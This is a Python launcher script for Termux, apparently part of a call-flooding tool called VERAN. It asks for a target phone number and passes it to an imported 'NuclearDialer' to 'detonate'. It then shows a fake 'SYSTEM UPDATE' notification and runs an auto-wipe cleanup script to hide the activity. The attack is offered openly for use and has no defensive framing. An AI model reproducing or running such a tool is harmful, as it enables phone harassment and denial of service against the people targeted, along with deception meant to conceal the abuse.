#!/data/data/com.termux/files/usr/bin/python3  
import os  
import sys  
import tempfile  
from core.call_flood import NuclearDialer  

class VERAN:  
    def __init__(self):  
        # HEADING **ONLY** IN TERMUX (ANSI RED)  
        self.banner = "\033[91m" + """  
        ██▒   █▓ ██▓ ██▀███   ▄████▄   ██▓  
        ▓██░   █▒▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓██▒  
        ▓██  ██░▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▒██░  
         ▒██ ██░▒██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒██░  
          ▒▀█░  ░██░░██▓ ▒██▒▒ ▓███▀ ░░██████▒  
          ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░ ▒░▓  ░  
            ░    ▒ ░  ░▒ ░ ▒░  ░  ▒   ░ ░ ▒  ░  
            ░    ▒ ░  ░░   ░ ░         ░ ░  
            ░    ░     ░     ░ ░          ░  ░  
        """ + "\033[0m"  
        print(self.banner)  # LOCAL TERMUX ONLY  
        self.dialer = NuclearDialer()  

    def ignite(self, target):  
        # RAM-BASED OPERATION (NO DISK WRITES)  
        with tempfile.NamedTemporaryFile(delete=True) as tmp:  
            tmp.write(f"TARGET: {target}".encode())  
            self.dialer.detonate(target)  
        os.system("termux-notification -t 'SYSTEM UPDATE'")  # Fake notification  

if __name__ == "__main__":  
    tool = VERAN()  
    target = input("[*] ENTER TARGET NUMBER: ")  
    tool.ignite(target)  
    os.system("./lib/ghost_cleanup.sh")  # AUTO-WIPE  
